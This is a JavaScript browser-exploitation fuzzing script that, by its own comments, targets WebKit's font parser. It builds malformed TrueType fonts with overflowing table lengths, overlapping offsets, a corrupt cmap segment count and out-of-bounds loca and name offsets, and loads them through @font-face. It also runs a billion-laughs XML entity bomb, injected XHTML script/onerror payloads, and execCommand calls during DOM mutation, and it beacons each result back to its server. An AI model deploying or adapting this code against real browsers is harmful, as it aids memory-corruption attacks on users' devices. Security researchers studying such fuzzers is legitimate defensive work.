/* p96-font-fuzz — Crafted font exploitation + DOMParser + SubtleCrypto
 *
 * p95 proved: @font-face WORKS (font parser reachable)
 * Font parsing is the #1 WebKit CVE category after JIT.
 * WebKit's font parser handles TrueType/OpenType/WOFF2 in C++.
 *
 * Strategy: feed increasingly malformed fonts to trigger parser bugs.
 * Also test DOMParser XML edges and SubtleCrypto.
 *
 * Beacon prefix: V96F-
 */
(function(){
"use strict";
var RUN_ID = "v96f" + Math.random().toString(36).slice(2,12);
var PREFIX = "V96F-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press96-font-fuzz");

/* Helper: build a minimal TrueType font with controllable table data */
function buildTTF(opts) {
  var tables = opts.tables || [];
  var numTables = tables.length;
  var headerSize = 12 + numTables * 16;
  var totalSize = headerSize;
  for (var i = 0; i < tables.length; i++) {
    totalSize += tables[i].data.length;
    totalSize += (4 - (tables[i].data.length % 4)) % 4; // padding
  }

  var buf = new ArrayBuffer(totalSize);
  var dv = new DataView(buf);
  var u8 = new Uint8Array(buf);

  // Offset table
  dv.setUint32(0, 0x00010000); // sfVersion (TrueType)
  dv.setUint16(4, numTables);
  var sp = 1;
  while (sp * 2 <= numTables) sp *= 2;
  dv.setUint16(6, sp * 16); // searchRange
  dv.setUint16(8, Math.log2(sp)); // entrySelector
  dv.setUint16(10, numTables * 16 - sp * 16); // rangeShift

  var offset = headerSize;
  for (var t = 0; t < tables.length; t++) {
    var tag = tables[t].tag;
    var data = tables[t].data;
    var recordOffset = 12 + t * 16;

    // Write tag as 4 ASCII bytes
    for (var c = 0; c < 4; c++) {
      u8[recordOffset + c] = tag.charCodeAt(c);
    }
    // Checksum (fake)
    dv.setUint32(recordOffset + 4, opts.badChecksum ? 0xDEADBEEF : 0);
    // Offset — can be corrupted
    dv.setUint32(recordOffset + 8, tables[t].fakeOffset || offset);
    // Length — can be corrupted
    dv.setUint32(recordOffset + 12, tables[t].fakeLength || data.length);

    // Write actual table data
    u8.set(new Uint8Array(data.buffer || data), offset);
    offset += data.length;
    offset += (4 - (data.length % 4)) % 4;
  }

  return buf;
}

function makeTableData(size, fill) {
  var d = new Uint8Array(size);
  if (typeof fill === 'number') d.fill(fill);
  return d;
}

function toBase64(arrayBuffer) {
  var bytes = new Uint8Array(arrayBuffer);
  var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  var b64 = '';
  for (var i = 0; i < bytes.length; i += 3) {
    var b0 = bytes[i], b1 = bytes[i+1] || 0, b2 = bytes[i+2] || 0;
    b64 += chars[b0 >> 2] + chars[((b0 & 3) << 4) | (b1 >> 4)] +
      chars[((b1 & 0xF) << 2) | (b2 >> 6)] + chars[b2 & 0x3F];
  }
  var pad = bytes.length % 3;
  if (pad === 1) b64 = b64.slice(0, -2) + '==';
  else if (pad === 2) b64 = b64.slice(0, -1) + '=';
  return b64;
}

function loadFont(name, b64data, format, textContent) {
  return new Promise(function(resolve) {
    var r = {};
    try {
      var fmt = format || 'truetype';
      var mime = fmt === 'woff2' ? 'font/woff2' : 'font/ttf';
      var css = '@font-face{font-family:"' + name + '";src:url(data:' + mime +
        ';base64,' + b64data + ') format("' + fmt + '")}';
      var style = document.createElement('style');
      style.textContent = css + '.' + name + '{font-family:"' + name + '",sans-serif}';
      document.head.appendChild(style);

      var div = document.createElement('div');
      div.className = name;
      div.style.cssText = 'position:absolute;left:-9999px;font-size:48px;';
      div.textContent = textContent || 'ABCDEFGHIJKLMNOP￿\u0000\u0001';
      document.body.appendChild(div);

      // Force synchronous layout
      var w1 = div.offsetWidth;
      var h1 = div.offsetHeight;
      r.w = w1;
      r.h = h1;

      // Wait for font load attempt
      setTimeout(function() {
        r.w2 = div.offsetWidth;
        r.h2 = div.offsetHeight;
        r.sizeChanged = (w1 !== r.w2 || h1 !== r.h2);
        r.LOADED = r.sizeChanged; // size change = font was applied
        style.remove();
        div.remove();
        resolve(r);
      }, 500);
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0, 60);
      resolve(r);
    }
  });
}

/* ====== F1: head table with length overflow (points past buffer) ====== */
function test_F1() {
  var headData = makeTableData(54, 0); // head table is 54 bytes
  var dv = new DataView(headData.buffer);
  dv.setUint32(0, 0x00010000); // version
  dv.setUint16(4, 0); // fontRevision
  dv.setUint32(8, 0xB1B0AFBA); // checksumAdjustment magic
  dv.setUint32(12, 0x5F0F3CF5); // magicNumber
  dv.setUint16(16, 0x000B); // flags
  dv.setUint16(18, 2048); // unitsPerEm

  var ttf = buildTTF({
    tables: [{
      tag: 'head', data: headData,
      fakeLength: 0xFFFFFF00 // OVERFLOW: claims 4GB length
    }]
  });
  var b64 = toBase64(ttf);
  loadFont('F1', b64).then(function(r) {
    r.test = 'head-overflow';
    B("F1-HEAD-OVERFLOW", r);
  });
}

/* ====== F2: Overlapping table offsets ====== */
function test_F2() {
  var headData = makeTableData(54, 0);
  var cmapData = makeTableData(100, 0x41);

  var ttf = buildTTF({
    tables: [
      { tag: 'head', data: headData },
      { tag: 'cmap', data: cmapData, fakeOffset: 12 + 2*16 } // points to SAME offset as head
    ]
  });
  var b64 = toBase64(ttf);
  loadFont('F2', b64).then(function(r) {
    r.test = 'overlapping-tables';
    B("F2-OVERLAP", r);
  });
}

/* ====== F3: cmap format 4 with corrupt segment count ====== */
function test_F3() {
  // Build a cmap table with format 4 subtable
  var cmap = new ArrayBuffer(200);
  var dv = new DataView(cmap);
  dv.setUint16(0, 0); // version
  dv.setUint16(2, 1); // numTables
  // Encoding record
  dv.setUint16(4, 0); // platformID
  dv.setUint16(6, 3); // encodingID
  dv.setUint32(8, 12); // offset to subtable

  // Format 4 subtable at offset 12
  dv.setUint16(12, 4); // format
  dv.setUint16(14, 188); // length (claimed — bigger than actual data)
  dv.setUint16(16, 0); // language
  dv.setUint16(18, 0xFFFE); // segCountX2 — HUGE (32767 segments!)

  // Minimal head
  var headData = makeTableData(54, 0);
  new DataView(headData.buffer).setUint32(12, 0x5F0F3CF5);
  new DataView(headData.buffer).setUint16(18, 2048);

  var ttf = buildTTF({
    tables: [
      { tag: 'cmap', data: new Uint8Array(cmap) },
      { tag: 'head', data: headData }
    ]
  });
  var b64 = toBase64(ttf);
  loadFont('F3', b64).then(function(r) {
    r.test = 'cmap-huge-segcount';
    B("F3-CMAP-SEGCOUNT", r);
  });
}

/* ====== F4: loca table with offsets past glyf ====== */
function test_F4() {
  var headData = makeTableData(54, 0);
  var hdv = new DataView(headData.buffer);
  hdv.setUint32(12, 0x5F0F3CF5);
  hdv.setUint16(18, 2048);
  hdv.setInt16(50, 1); // indexToLocFormat = 1 (long offsets)

  // maxp: claims 5 glyphs
  var maxpData = new ArrayBuffer(6);
  var mdv = new DataView(maxpData);
  mdv.setUint32(0, 0x00005000); // version
  mdv.setUint16(4, 5); // numGlyphs

  // loca: 6 long offsets (numGlyphs + 1), all pointing way past glyf
  var locaData = new ArrayBuffer(24);
  var ldv = new DataView(locaData);
  for (var i = 0; i < 6; i++) {
    ldv.setUint32(i * 4, 0x7FFFFFFF); // all offsets = 2GB into glyf
  }

  // Tiny glyf
  var glyfData = makeTableData(20, 0xFF);

  var ttf = buildTTF({
    tables: [
      { tag: 'head', data: headData },
      { tag: 'maxp', data: new Uint8Array(maxpData) },
      { tag: 'loca', data: new Uint8Array(locaData) },
      { tag: 'glyf', data: glyfData }
    ]
  });
  var b64 = toBase64(ttf);
  loadFont('F4', b64).then(function(r) {
    r.test = 'loca-past-glyf';
    B("F4-LOCA-OOB", r);
  });
}

/* ====== F5: Massive name table with crafted strings ====== */
function test_F5() {
  // name table with string offsets pointing outside the table
  var nameData = new ArrayBuffer(256);
  var ndv = new DataView(nameData);
  ndv.setUint16(0, 0); // format
  ndv.setUint16(2, 4); // count (4 name records)
  ndv.setUint16(4, 6 + 4 * 12); // stringOffset — points past records

  for (var i = 0; i < 4; i++) {
    var off = 6 + i * 12;
    ndv.setUint16(off, 0); // platformID
    ndv.setUint16(off + 2, 3); // encodingID
    ndv.setUint16(off + 4, 0); // languageID
    ndv.setUint16(off + 6, i); // nameID
    ndv.setUint16(off + 8, 0xFFF0); // length — HUGE, points past table
    ndv.setUint16(off + 10, 0); // offset
  }

  var headData = makeTableData(54, 0);
  new DataView(headData.buffer).setUint32(12, 0x5F0F3CF5);
  new DataView(headData.buffer).setUint16(18, 2048);

  var ttf = buildTTF({
    tables: [
      { tag: 'head', data: headData },
      { tag: 'name', data: new Uint8Array(nameData) }
    ]
  });
  var b64 = toBase64(ttf);
  loadFont('F5', b64).then(function(r) {
    r.test = 'name-oob-string';
    B("F5-NAME-OOB", r);
  });
}

/* ====== F6: DOMParser XML billion laughs ====== */
function test_F6() {
  var r = {};
  try {
    // Billion laughs variant
    var xml = '<?xml version="1.0"?>';
    xml += '<!DOCTYPE lolz [';
    xml += '<!ENTITY lol "lol">';
    xml += '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">';
    xml += '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">';
    xml += '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">';
    xml += ']>';
    xml += '<root>&lol4;</root>';

    var doc = new DOMParser().parseFromString(xml, 'text/xml');
    var pe = doc.querySelector('parsererror');
    r.parseError = pe ? pe.textContent.slice(0, 80) : 'none';
    r.rootText = doc.documentElement ? doc.documentElement.textContent.slice(0, 50) : 'null';
    r.rootLen = doc.documentElement ? doc.documentElement.textContent.length : -1;
    r.BILLION_LAUGHS = r.rootLen > 10000;

    // Namespace confusion: XHTML element inside XML
    var xml2 = '<?xml version="1.0"?><root xmlns:x="http://www.w3.org/1999/xhtml">' +
      '<x:script>alert(1)</x:script>' +
      '<x:img x:src="x" x:onerror="alert(2)"/>' +
      '</root>';
    var doc2 = new DOMParser().parseFromString(xml2, 'text/xml');
    r.nsDoc = doc2.documentElement ? doc2.documentElement.children.length : -1;

    // Deep nesting
    var depth = 10000;
    var xml3 = '<?xml version="1.0"?>' + '<a>'.repeat(depth) + 'deep' + '</a>'.repeat(depth);
    try {
      var doc3 = new DOMParser().parseFromString(xml3, 'text/xml');
      var pe3 = doc3.querySelector('parsererror');
      r.deepNest = pe3 ? 'parseError' : 'ok';
    } catch(e3) {
      r.deepNest = 'threw:' + e3.name;
    }

  } catch(e) { r.err = e.name + ":" + e.message.slice(0, 60); }
  B("F6-DOMPARSER", r);
}

/* ====== F7: SubtleCrypto edge cases ====== */
function test_F7() {
  var r = {};
  var pending = 0;

  function done() {
    pending--;
    if (pending <= 0) B("F7-CRYPTO", r);
  }

  try {
    // Test 1: Import a raw key of length 0
    pending++;
    crypto.subtle.importKey('raw', new ArrayBuffer(0), {name: 'AES-GCM'}, false, ['encrypt'])
      .then(function(k) { r.zeroKey = 'imported'; done(); })
      .catch(function(e) { r.zeroKey = 'err:' + e.message.slice(0,40); done(); });

    // Test 2: Digest enormous data (16MB)
    pending++;
    try {
      var big = new ArrayBuffer(16 * 1024 * 1024);
      new Uint8Array(big).fill(0x42);
      crypto.subtle.digest('SHA-256', big)
        .then(function(h) {
          r.bigDigest = 'ok:' + new Uint8Array(h).slice(0,4).join(',');
          done();
        })
        .catch(function(e) { r.bigDigest = 'err:' + e.message.slice(0,40); done(); });
    } catch(e) { r.bigDigest = 'threw:' + e.message.slice(0,40); pending--; }

    // Test 3: importKey with wrong algorithm params
    pending++;
    crypto.subtle.importKey('raw', new Uint8Array([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]).buffer,
      {name: 'AES-CBC'}, true, ['encrypt','decrypt'])
      .then(function(key) {
        // Encrypt with mismatched IV length
        return crypto.subtle.encrypt({name:'AES-CBC', iv: new Uint8Array(1)}, key, new Uint8Array([1,2,3]).buffer);
      })
      .then(function(enc) { r.badIV = 'encrypted?!'; done(); })
      .catch(function(e) { r.badIV = 'err:' + e.message.slice(0,40); done(); });

    // Test 4: ECDH with invalid curve point
    pending++;
    var badJwk = {kty:'EC', crv:'P-256', x:'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
      y:'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', d:'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'};
    crypto.subtle.importKey('jwk', badJwk, {name:'ECDH', namedCurve:'P-256'}, true, ['deriveBits'])
      .then(function(k) { r.badCurve = 'imported?!'; done(); })
      .catch(function(e) { r.badCurve = 'err:' + e.message.slice(0,40); done(); });

    // Test 5: RSA key generation (if supported)
    pending++;
    crypto.subtle.generateKey({name:'RSA-OAEP', modulusLength:512, publicExponent:new Uint8Array([1,0,1]),
      hash:'SHA-256'}, true, ['encrypt','decrypt'])
      .then(function(kp) { r.rsaGen = 'ok'; done(); })
      .catch(function(e) { r.rsaGen = 'err:' + e.message.slice(0,40); done(); });

  } catch(e) { r.err = e.message.slice(0, 60); B("F7-CRYPTO", r); }
}

/* ====== F8: execCommand during DOM mutation ====== */
function test_F8() {
  var r = {};
  try {
    // Create editable area
    var div = document.createElement('div');
    div.contentEditable = 'true';
    div.style.cssText = 'position:absolute;left:-9999px;width:200px;height:100px;';
    div.innerHTML = '<p>editable <b>content</b> here</p><p>second paragraph</p>';
    document.body.appendChild(div);
    div.focus();

    // Select all content
    var sel = window.getSelection();
    sel.selectAllChildren(div);
    r.selStr = sel.toString().slice(0, 50);

    // execCommand during MutationObserver
    var mutCount = 0;
    var observer = new MutationObserver(function(records) {
      mutCount++;
      if (mutCount > 5) return;
      // Re-format during mutation callback
      try { document.execCommand('bold', false, null); } catch(e) {}
    });
    observer.observe(div, { childList: true, subtree: true, characterData: true });

    // Trigger formatting commands rapidly
    var cmds = ['bold', 'italic', 'underline', 'insertUnorderedList',
      'insertOrderedList', 'indent', 'outdent', 'strikeThrough'];
    for (var i = 0; i < cmds.length; i++) {
      try {
        sel.selectAllChildren(div);
        var ok = document.execCommand(cmds[i], false, null);
        if (i === 0) r.firstCmd = cmds[i] + ":" + ok;
      } catch(e) {
        r.cmdErr = cmds[i] + ":" + e.message.slice(0, 30);
        break;
      }
    }

    // insertHTML with complex content
    try {
      sel.selectAllChildren(div);
      document.execCommand('insertHTML', false,
        '<table><tr><td>cell</td></tr></table><div style="float:left">float</div>');
      r.insertHTML = 'ok';
    } catch(e) {
      r.insertHTMLErr = e.message.slice(0, 40);
    }

    setTimeout(function() {
      observer.disconnect();
      r.mutCount = mutCount;
      r.finalHTML = div.innerHTML.slice(0, 200);
      r.SURVIVED = true;
      div.remove();
      B("F8-EXECCOMMAND", r);
    }, 1000);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0, 60); B("F8-EXECCOMMAND", r); }
}

/* ====== Run — safe tests first, font tests staggered ====== */
try {
  test_F6(); // DOMParser (safe)
  test_F7(); // Crypto (safe)
  setTimeout(test_F8, 1500);  // execCommand
  setTimeout(test_F1, 3000);  // head overflow
  setTimeout(test_F2, 4500);  // overlapping tables
  setTimeout(test_F3, 6000);  // cmap huge segcount
  setTimeout(test_F4, 7500);  // loca past glyf
  setTimeout(test_F5, 9000);  // name OOB string
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe96-done"); }, 30000);
})();
